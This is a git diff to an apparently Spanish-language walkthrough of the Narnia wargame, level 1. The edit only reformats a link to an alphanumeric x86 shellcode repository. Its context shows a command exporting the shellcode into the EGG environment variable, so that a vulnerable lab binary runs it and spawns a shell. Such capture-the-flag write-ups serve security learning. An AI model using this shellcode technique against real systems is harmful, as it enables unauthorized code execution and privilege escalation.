@@ -40,7 +40,7 @@ int main(){
 Dado que este binario ejecuta el contenido de ret, podemos alimentar el código de shell ret y se ejecutará.
 
 En este caso estaré usando el siguiente shellcode puramente alfanumérico: 
-(https://github.com/push4d/Shellcode-alfanumerico---Spawn-bin-sh-elf-x86-)
+[https://github.com/push4d/Shellcode-alfanumerico---Spawn-bin-sh-elf-x86-](https://github.com/push4d/Shellcode-alfanumerico---Spawn-bin-sh-elf-x86-)
 
 ```
 narnia1@narnia:/narnia$ export EGG=hzzzzYAAAAAA0HM0hN0HNhu12ZX5ZBZZPhu834X5ZZZZPTYhjaaaX5aaaaP5aaaa5jaaaPPQTUVWaMz
